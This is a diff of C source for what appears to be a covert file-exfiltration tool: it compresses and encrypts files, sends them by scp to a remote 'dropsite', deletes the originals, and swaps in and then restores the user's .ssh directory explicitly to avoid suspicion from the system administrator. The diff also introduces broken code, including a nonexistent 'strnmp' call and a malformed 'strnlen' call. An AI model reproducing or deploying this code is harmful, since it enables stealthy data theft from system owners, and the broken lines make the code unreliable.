@@ -20,6 +20,27 @@
 #include "compression.h"
 #include "cryptography.h"
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_start
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void *ssh_start(void *ptr)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Watcher thread for the SSH dropsite service. Basically initializes a
+ *        libevent timer to be executed every X seconds. This allows the server
+ *        to check for any files in the pickup directory for sending to the
+ *        dropsite. Normally the timer would be set to 10 minutes (600 seconds)
+ *        in order to reduce the amount of possible network traffic.
+ *----------------------------------------------------------------------------*/
 void *ssh_start(void *ptr)
 {
 	struct event timeout;
@@ -40,6 +61,25 @@ void *ssh_start(void *ptr)
 	return NULL;
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_replace_dir
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_replace_dir(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Creates the .ssh directory and backup directory if they don't exist.
+ *        It then downloads a premade .ssh directory with authorization keys to
+ *        match the dropsite and expands the contents into the current .ssh dir.
+ *----------------------------------------------------------------------------*/
 void ssh_replace_dir(void)
 {
 	char *command = (char *)malloc(FILENAME_MAX);
@@ -73,6 +113,24 @@ void ssh_replace_dir(void)
 	free(command);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_restore_dir
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_restore_dir(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Restores the original .ssh directory in order to reduce any possible
+ *        suspicion from the system administrator.
+ *----------------------------------------------------------------------------*/
 void ssh_restore_dir(void)
 {
 	char *command = (char *)malloc(FILENAME_MAX);
@@ -98,12 +156,31 @@ void ssh_restore_dir(void)
 	free(command);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_send_files
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_send_files(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Looks for files in the SYMLINK_DIR and, if any, compresses and
+ *        encrypts them into the PICKUP_DIR. Then each file that is in the
+ *        PICKUP_DIR gets sent to the remote dropsite and the original
+ *        files & symlinks get deleted.
+ *----------------------------------------------------------------------------*/
 void ssh_send_files(void)
 {
 	struct dirent *dp;
 	DIR *dir = opendir(SYMLINK_DIR);
 	FILE *fd_in, *fd_out;
-	int count = 0;
 	char *file_in = (char *)malloc(FILENAME_MAX);
 	char *file_out = (char *)malloc(FILENAME_MAX);
 	char *command = (char *)malloc(FILENAME_MAX);
@@ -115,60 +192,62 @@ void ssh_send_files(void)
 
 	while ((dp = readdir(dir)) != NULL) {
 		/* ignore first two entires "." and ".." */
-		if (count++ > 1 && strncmp(dp->d_name, ".send", strlen(dp->d_name))) {
-			/* compress the file */
-			memset(file_in, 0x00, FILENAME_MAX);
-			memset(file_out, 0x00, FILENAME_MAX);
-			sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
-			sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
+		if (strncmp(dp->d_name, ".", strlen(dp->d_name))) {
+			if (strnmp(dp->d_name, "..", strnlen(dp->d_name))) {
+				/* compress the file */
+				memset(file_in, 0x00, FILENAME_MAX);
+				memset(file_out, 0x00, FILENAME_MAX);
+				sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
+				sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
 
-			if ((fd_in = fopen(file_in, "r")) == NULL)
-				err(1, "fopen");
-			
-			if ((fd_out = fopen(file_out, "w")) == NULL)
-				err(1, "fopen");
+				if ((fd_in = fopen(file_in, "r")) == NULL)
+					err(1, "fopen");
 
-			if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
-				fprintf(stderr, "ZLIB: Error deflating file %s\n", file_in);
-				exit(ERROR);
+				if ((fd_out = fopen(file_out, "w")) == NULL)
+					err(1, "fopen");
+
+				if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
+					fprintf(stderr, "ZLIB: Error deflating file %s\n", file_in);
+					exit(ERROR);
+				}
+
+				/* delete symlink */
+				remove(file_in);
+
+				fclose(fd_in);
+				fclose(fd_out);
+
+				/* encrypt the file */
+				memset(file_in, 0x00, FILENAME_MAX);
+				memset(file_out, 0x00, FILENAME_MAX);
+				sprintf(file_in, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
+				sprintf(file_out, "%s%s", PICKUP_DIR, dp->d_name);
+
+				if ((fd_in = fopen(file_in, "r")) == NULL)
+					err(1, "fopen");
+
+				if ((fd_out = fopen(file_out, "w")) == NULL)
+					err(1, "fopen");
+
+				file_encrypt(fd_in, fd_out);
+
+				/* delete compressed file */
+				remove(file_in);
+
+				fclose(fd_in);
+				fclose(fd_out);			
+
+				/* send the file */
+				memset(command, 0x00, FILENAME_MAX);
+				sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out,
+						DROPSITE, DROPSITE_DIR);
+
+				if (system(command) == ERROR)
+					err(1, "system");
+
+				/* delete compressed & encrypted file */
+				remove(file_out);
 			}
-
-			/* delete symlink */
-			remove(file_in);
-
-			fclose(fd_in);
-			fclose(fd_out);
-
-			/* encrypt the file */
-			memset(file_in, 0x00, FILENAME_MAX);
-			memset(file_out, 0x00, FILENAME_MAX);
-			sprintf(file_in, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
-			sprintf(file_out, "%s%s", PICKUP_DIR, dp->d_name);
-
-			if ((fd_in = fopen(file_in, "r")) == NULL)
-				err(1, "fopen");
-			
-			if ((fd_out = fopen(file_out, "w")) == NULL)
-				err(1, "fopen");
-
-			file_encrypt(fd_in, fd_out);
-
-			/* delete compressed file */
-			remove(file_in);
-
-			fclose(fd_in);
-			fclose(fd_out);			
-
-			/* send the file */
-			memset(command, 0x00, FILENAME_MAX);
-			sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out,
-					DROPSITE, DROPSITE_DIR);
-
-			if (system(command) == ERROR)
-				err(1, "system");
-
-			/* delete compressed & encrypted file */
-			remove(file_out);
 		}
 	}
 
@@ -179,6 +258,26 @@ void ssh_send_files(void)
 	closedir(dir);
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_timer
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_timer(int fd, short event, void *arg)
+ *                   fd - event timer
+ *                   event - the event timeout
+ *                   arg - event argument
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Resets the event timer to EVENT_TIMER.
+ *----------------------------------------------------------------------------*/
 void ssh_timer(int fd, short event, void *arg)
 {
 	struct timeval tv;
@@ -194,15 +293,27 @@ void ssh_timer(int fd, short event, void *arg)
 	event_add(timeout, &tv);
 }
 
-char *ssh_request_file(char *file_name)
-{
-	return NULL;
-}
-
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_dropsite_list
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_dropsite_list(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Prints out a list of all the files stored on the remote dropsite.
+ *----------------------------------------------------------------------------*/
 void ssh_dropsite_list(void)
 {
 	char *command = (char *)malloc(FILENAME_MAX);
-	
+
 	ssh_replace_dir();
 
 	memset(command, 0x00, FILENAME_MAX);
@@ -214,6 +325,24 @@ void ssh_dropsite_list(void)
 	ssh_restore_dir();
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_dropsite_get
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_dropsite_get(char *file_name)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Retrieves the specified file from the remote dropsite. Once retrieved
+ *        the file is decrypted and uncompressed to the current working dir.
+ *----------------------------------------------------------------------------*/
 void ssh_dropsite_get(char *file_name)
 {
 	EVP_CIPHER_CTX encrypt, decrypt;
@@ -221,7 +350,7 @@ void ssh_dropsite_get(char *file_name)
 	char *file_in = (char *)malloc(FILENAME_MAX);
 	char *file_out = (char *)malloc(FILENAME_MAX);
 	FILE *fd_in, *fd_out;
-	
+
 	/* initialize encryption */
 	if (aes_init(&encrypt, &decrypt) == ERROR)
 		fprintf(stderr, "ERROR: aes_init");
@@ -284,6 +413,24 @@ void ssh_dropsite_get(char *file_name)
 	ssh_restore_dir();
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_dropsite_delete
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_dropsite_delete(char *file_name)
+ *                   file_name - file to be deleted
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Deletes the specified file from the remote dropsite.
+ *----------------------------------------------------------------------------*/
 void ssh_dropsite_delete(char *file_name)
 {
 	char *command = (char *)malloc(FILENAME_MAX);
@@ -301,6 +448,23 @@ void ssh_dropsite_delete(char *file_name)
 	ssh_restore_dir();
 }
 
+/*-----------------------------------------------------------------------------
+ * FUNCTION:    ssh_dropsite_clear
+ * 
+ * DATE:        July 4, 2010
+ * 
+ * REVISIONS:   
+ * 
+ * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
+ * 
+ * INTERFACE:   void ssh_dropsite_clear(void)
+ * 
+ * RETURNS:     void
+ *
+ * NOTES: Deletes all files stored on the remote dropsite.
+ *----------------------------------------------------------------------------*/
 void ssh_dropsite_clear(void)
 {
 	char *command = (char *)malloc(FILENAME_MAX);
